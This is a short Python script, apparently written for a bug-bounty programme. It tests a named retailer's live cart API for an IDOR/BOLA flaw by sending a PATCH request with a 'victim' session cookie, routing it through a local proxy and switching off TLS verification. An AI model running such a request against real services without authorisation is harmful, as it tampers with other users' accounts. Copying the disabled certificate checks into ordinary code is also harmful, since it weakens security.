import requests
import json
import os
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
load_dotenv()

# The specific vulnerable-looking endpoint from Burp Suite
url = "https://api.iciparisxl.nl/api/v2/icinl3/users/anonymous/carts/9c9b5fbd-1796-4445-b150-d76a81e2b252/entries/0?lang=nl_NL&curr=EUR"

headers = {
    "Host": "api.iciparisxl.nl",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/json",
    "Origin": "https://www.iciparisxl.nl",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://www.iciparisxl.nl/",
    "Accept-Language": "en-US,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "X-Intigriti-Username": "mutasem_mk4"
}

payload = {"quantity": 10} 

victim_cookie = os.getenv("AUTH_TOKEN_VICTIM")

headers["Cookie"] = victim_cookie

print("🎯 [IDOR SNIPER] Target locked onto ICI PARIS XL Cart API...")
print(f"📡 Endpoint: {url}")
print("⚔️ Injection: Attempting to modify Target Cart using VICTIM tokens...")

proxies = {
    "http": "http://127.0.0.1:8081",
    "https": "http://127.0.0.1:8081",
}

try:
    response = requests.patch(url, headers=headers, json=payload, proxies=proxies, verify=False, timeout=20)
    print(f"\n[+] HTTP Status Code: {response.status_code}")
    print(f"[+] Server Response: {response.text}")
    print("-" * 50)
    
    if response.status_code == 200 or response.status_code == 201:
        print("\n🚨 CRITICAL VULNERABILITY CONFIRMED! (BOLA/IDOR) 🚨")
        print("Victim context successfully manipulated another user's cart!")
    elif response.status_code in [401, 403]:
        print("\n🛡️ Secure: The server correctly rejected the unauthorized request.")
    else:
        print("\n⚠️ Unknown state. Server responded unexpectedly.")
except Exception as e:
    print(f"\n[-] Request failed: {e}")
